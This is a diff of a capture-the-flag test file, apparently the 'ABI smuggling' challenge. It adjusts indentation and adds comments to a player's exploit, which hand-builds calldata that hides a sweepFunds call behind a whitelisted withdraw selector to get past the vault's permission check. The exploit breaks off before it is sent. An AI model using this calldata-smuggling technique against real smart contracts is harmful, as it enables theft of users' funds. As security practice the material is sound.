@@ -46,7 +46,7 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        let abi = [`function execute(address, bytes)`];
+    let abi = [`function execute(address, bytes)`];
     let iface = new ethers.utils.Interface(abi);
     let sig = iface.getSighash("execute");
     console.log(sig);
@@ -61,10 +61,12 @@ describe('[Challenge] ABI smuggling', function () {
     /** step 2: prepare nested msg.data; function sweepFunds is nested behind function withdraw */
     abi = ethers.utils.defaultAbiCoder;
     let params1 = "0x1cff79cd";
+    // mark the position of bytes parameter in execute
     let params2 = abi.encode(["address", "uint256"], [vault.address, 100]);
     let params3 = ethers.utils.hexZeroPad("0x0", 32);
     let params4 = "0xd9caed12";
     //Acutal bytes 'actiondata' contents starts here
+    // 68 marks size of the bytes, locate at the first byte32 of a bytes parameter
     let params5 = abi.encode(["uint256"], [68]);
     abi = ["function sweepFunds(address,address)"];
     iface = new ethers.utils.Interface(abi);
